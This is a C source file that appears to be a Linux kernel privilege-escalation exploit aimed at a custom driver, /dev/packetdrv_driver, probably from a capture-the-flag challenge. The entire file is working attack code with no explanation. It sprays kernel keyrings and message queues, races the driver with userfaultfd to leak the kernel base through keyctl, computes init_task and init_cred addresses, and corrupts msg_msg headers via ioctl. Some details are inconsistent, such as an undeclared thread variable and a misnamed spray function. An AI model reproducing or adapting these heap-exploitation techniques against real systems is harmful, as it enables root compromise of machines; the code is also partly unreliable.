#define _GNU_SOURCE
#include <asm/unistd_64.h>
#include <bits/types/struct_itimerspec.h>
#include <bits/time.h>
#include <sys/timerfd.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>
#include <stdlib.h>
#define OVERWRITE_SIZE 0xf
#define MSG_SIZE 0x10

int main();

int pfd;
long uffd;
int qids[0x20];
int32_t front_queue;
int* id_buffer;
unsigned long* bases;
long long old_rbp;
void* arb_read_uffd_pages;
void* arb_write_uffd_pages;
void* generic_overwrite;

char* key_title = "user";
struct uffdio_api uffdio_api;
struct uffdio_register uffdio_register;

pthread_t thr, thr2, thr3;

uint64_t INIT_TASK, INIT_CRED;

struct mesg_t {
    unsigned long unknown;
    void* ptr_to_something;
    unsigned long unknown2;
    unsigned long length;
};

typedef struct{
    long mtype;
    char mtext[1];
}msg;

typedef struct{
    void* ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
} msg_header;

void error_msg(char* mesg){
    puts(mesg);
    exit(-1);
}

void calc_offsets(uint64_t kbase){
    INIT_TASK = kbase + 0x140f2c0;
    INIT_CRED = kbase + 0x1459780;
}

int32_t make_queue(key_t key, int msgflg){
    int32_t res;
    if((res = msgget(key, msgflg)) == -1) error_msg("[-] failed to create msg queue");
    return res;
}

void spray_uring(uint len,long ptr){
    uint count = 0;
    int fid;
    void* temp;
    while(1){
        if(len <= count) return;
        temp = malloc(0x78);   
        *(void**)(count * 0x10 + ptr + 8) = temp;

        memset(*(void **)(ptr +count*0x10+8), 0, 0x78);
        fid = open("/dev/ptmx", 0x100);
        *(int *)(ptr+count*0x10) = fid;
        if(fid < 0) error_msg("[-] io_uring_create");

        count += 1;
    }

}

unsigned long* parse_leaks(unsigned long* blob, uint size){
    uint count = 0;
    unsigned long* leaks = malloc(0x10);

    puts("HITTTTTTTTTTTT!!!!!!!!");
    while(1){
        if(size <= count) {
            free(leaks);
            return 0;
        }
        if((blob[count] & 0xffffffff80000000) == 0xffffffff80000000) printf("0x%lx\n", blob[count] );
        if((blob[count] & 0xffff0) == 0xa2630) break;
        if((blob[count] & 0xffff0) == 0x98c90){
            leaks[0] = blob[count] + -0x798c90;
            leaks[0] &= 0xFFFFFFFFFFFFFFF0;
            leaks[1] = blob[count+5] & 0xffffffff00000000;
            return leaks;
        }
        count += 1;
    }
    leaks[0] = blob[count] + -0x7a2630;
    leaks[0] &= 0xFFFFFFFFFFFFFFF0;
    for(int i =1; i < 10; ++i) 
        printf("0x%lx\n", blob[count+i] );
    leaks[1] = blob[count+4] & 0xffffffff00000000;
    return leaks;
}

unsigned long* get_keyring_leak(int* key_ids, uint size){
    char leak[0x10000];
    uint count;
    unsigned long* parsed_leaks;
    int ret_val;
    memset(leak, 0, 0xffef);
    count = 0;

    while(1){
        if(size <= count) return 0;
        printf("key: %d\n", key_ids[count]);
        ret_val = syscall(0xfa, 0xb, key_ids[count], &leak, 0xffff, 0); //keyctl
        if(ret_val < 0) break;
        printf("ret value: 0x%x\n", ret_val);
        puts(leak);

        if(ret_val == 0xffff){
            parsed_leaks = parse_leaks((unsigned long*)&leak, 0x1fff);
            return parsed_leaks;
        }
        
        count += 1;
    }

    error_msg("[-] keyctl");

    exit(1);
}

void release_keys(uint* keys, uint size){
    long ret_val;
    uint count = 0;
    while(1){
        if(size <= count){
            free(keys);
            return;
        }
        ret_val = syscall(0xfa, 3, keys[count], 0, 0, 0);
        if(ret_val < 0) break;
        count += 1;
    }
    error_msg("[-] removing keys");
    exit(1);
}

void release_uring(void *urings, uint size){
    uint count = 0;
    for(count = 0; count < size; count++){
        printf("[*] closing uring %d\n", *(int*)((long)urings + (count * 0x10)));
        close(*(int*)((long)urings + (count *0x10)));
    }
    free(urings);
    return;
}

void sploit(){
    //msg_header evil;
    int32_t qid;
    char buffer[0x1000];
    msg* spray = (msg*)buffer;
    int qids[0x100];

    //memset(&evil, 'A', sizeof(msg_header));
    for(int j = 0; j < 0x100; j++){
        qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        if(qid == -1) error_msg("[-] failed to create spray_queue");
        printf("[+] msg qid %d\n", qid);
        qids[j] = qid;

        spray->mtype = 1;
        memset(spray->mtext, 0x44, 0xc0-0x30);
        //for(int i = 0; i < 0x20; i++)
        if(msgsnd(qid, spray, 0xc0-0x30, IPC_NOWAIT) != 0) error_msg("[spray_failed]");

    }

    puts("[+] msg send success");
    memset(generic_overwrite+0xFC0, 'C', 0x28);
    memcpy(generic_overwrite+0xFC8, "\x00\x00\x00\x00\x00\x00\x00\x20", 8);

    ioctl(pfd, 0, generic_overwrite+0xFC0);

    getchar();
}

void* fault_handler(void* arg){
    long uffd = (long)arg;
    void* leak;
    //asm volatile ("mov %0, %%rbp" : : "r" (old_rbp));

    printf("got execution %p\n", arg);

    leak = calloc(100,0x10);
    if(!leak)error_msg("[-] calloc");

    spray_uring(100, (long)leak);

    puts("[+]attempting to get leak");
    bases = get_keyring_leak(id_buffer, 0x32);
    printf("base: %p\n", bases);

    release_keys((uint*)id_buffer, 0x32);
    release_uring(leak, 100);

    if(bases == 0){
        munmap(arb_read_uffd_pages, 0x2000);
        close(pfd);
        main();
    } else {
        printf("base 1: 0x%lx\n", bases[0]);
        printf("base 2: 0x%lx\n", bases[1]);
        calc_offsets(bases[0]);
        sploit();
    }

    exit(0);

}

void create_userfaultfd(void* addr, pthread_t thr, void*(*func_ptr)(void*)){
    int tid;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if(uffd == -1) error_msg("[-] uffd create");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api)==-1) error_msg("[-] uffdio api");

    puts("[+]uffd api initiated");

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = 0x1000;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) error_msg("[-] failed to register uffdio_register");

    tid = pthread_create(&thr, (pthread_attr_t *)0, func_ptr, (void*)uffd);
    if(tid) error_msg("[-] failled to start thread");

    return;

}

void* spray_keyring(uint size){
    void * keys;
    uint * key;
    uint ret;
    char name[48];
    uint count = 0;
    size_t len;

    keys = calloc((ulong)size, 4);
    if(!keys) error_msg("[-] Calloc");

    while(1){
        if(size <= count){
            return keys;
        }
        snprintf(name, 0x28, "EEEEEEEEEEE%03du", count);
        len = strlen(name);
        key = ((ulong)count*4+keys);

        ret = syscall(0xf8,key_title, name, name, len, 0xFFFFFFFC);
        printf("[+] added key %du\n", ret);
        *key = ret;
        if((int)ret < 0) break;
        count += 1;

    }
    error_msg("[-] add key");

    exit(1);

}

void send_payload(uint length, void* mem_ptr){
    struct mesg_t to_send;
    to_send.length = length;
    to_send.ptr_to_something = mem_ptr;

    ioctl(pfd, 0x1337, &to_send);
}

int main(void){
    long test[OVERWRITE_SIZE];
    void* userfault_addr;

    arb_read_uffd_pages = mmap((void *)0x1337000, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
    arb_write_uffd_pages = mmap((void *)0xbabe000, 0x2000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
    generic_overwrite = mmap((void *)0xcafe000, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
    userfault_addr = arb_read_uffd_pages + 0x1000;

    //front_queue = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);


    if((unsigned long)arb_read_uffd_pages != 0x1337000) error_msg("Failed to initialize the memory page");


    pfd = open("/dev/packetdrv_driver", O_RDWR);
    if(pfd < 0) error_msg("failed to open driver");
    
    test[0] = 1;
    test[1] = 0xFFFFFFFFFFFFFFFF;
    test[2] = 0;
    test[3] = 0x4141414141414141;
    test[4] = 0x4141414141414141;
    test[5] = 0x4141414141414141;
    test[6] = 0x4141414141414141;
    test[7] = 0x4141414141414141;
    test[8] = 0;
    test[9] = 0;
    test[10] = 0xffff;

    memcpy(arb_read_uffd_pages+(0x1000 - OVERWRITE_SIZE*8), test, OVERWRITE_SIZE*8);

    id_buffer = spray_keyring(0x32);
    create_userfaultfd(userfault_addr, thr1, fault_handler);
    //create_userfaultfd(arb_write_uffd_pages+0x1000, thr2, fault_handler2);
    
    asm volatile ("mov %%rbp, %0" : "=r" (old_rbp));
    printf("old RBP: 0x%llx\n", old_rbp);

    long long modifiedRBP;
    asm volatile ("mov %0, %%rbp" : : "r" (arb_read_uffd_pages+(0x1000-OVERWRITE_SIZE*8)));
    asm volatile ("mov %%rbp, %0" : "=r" (modifiedRBP));

    printf("Modified RBP: 0x%llx\n", modifiedRBP);
    //test = malloc(0x20);
    //memset(test, 'A', 0x20);

    //send_payload(0x38, NULL);
    ioctl(pfd, 0x1337, modifiedRBP);
    asm volatile ("mov %0, %%rbp" : : "r" (old_rbp));
    puts("ioctl complete");


    return 0;
}
